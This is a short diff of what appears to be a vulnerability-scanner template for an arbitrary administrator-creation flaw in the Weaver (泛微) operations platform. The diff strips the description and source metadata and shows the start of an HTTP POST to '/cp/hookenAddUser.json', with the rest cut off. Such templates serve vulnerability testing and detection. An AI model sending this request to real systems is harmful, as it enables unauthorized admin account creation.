@@ -3,12 +3,8 @@ info:
   name: 泛微运维平台存在任意管理员用户创建漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wu2zy1ycu6gca8og'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wu2zy1ycu6gca8og
-    fofa: 暂无
 http:
 - raw:
   - 'POST /cp/hookenAddUser.json HTTP/1.1
